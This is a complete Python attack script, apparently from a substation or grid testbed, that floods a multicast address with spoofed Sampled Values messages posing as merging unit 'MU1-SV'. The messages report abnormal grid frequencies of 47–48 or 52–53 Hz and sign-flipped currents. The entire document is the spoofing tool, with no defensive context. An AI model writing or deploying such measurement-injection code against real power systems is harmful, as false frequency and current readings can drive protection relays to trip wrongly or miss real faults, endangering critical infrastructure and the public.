"""
Frequency spoofing script

Author: Zein Ali
Date: 01/07/2025
"""

import socket
import struct
import time
import json
import random

MCAST_IP = "239.192.0.1"
PORT = 10010
DELAY = 1

NOM_VOLT = 230.0
NOM_CURR = 500.0

def spoof_freq():
    return round(random.uniform(47.0, 48.0), 2) if random.random() > 0.5 else round(random.uniform(52.0, 53.0), 2)

def random_current():
    return NOM_CURR * (1 + random.uniform(-0.01, 0.01)) * random.choice([-1, 1])

def run():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, struct.pack('b', 1))

    print(f"Sending spoofed SV to {MCAST_IP}:{PORT}")

    count = 0
    start = time.time()

    while True:
        try:
            now = time.time() - start
            ts = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()) + f".{int((now % 1) * 1000):03d}Z"

            msg = {
                "svID": "MU1-SV",
                "datSet": "MeasMU1",
                "vlan": 10,
                "priority": 4,
                "utc_timestamp": ts,
                "sampleCount": count,
                "freq": spoof_freq(),
                "Ia": random_current(),
                "Ib": random_current(),
                "Ic": random_current(),
                "Ua": NOM_VOLT,
                "Ub": NOM_VOLT,
                "Uc": NOM_VOLT
            }

            s.sendto(json.dumps(msg).encode(), (MCAST_IP, PORT))
            count += 1
            time.sleep(DELAY)

        except KeyboardInterrupt:
            print("\nStopped.")
            break
        except Exception as e:
            print("Error:", e)
            break

if __name__ == "__main__":
    run()
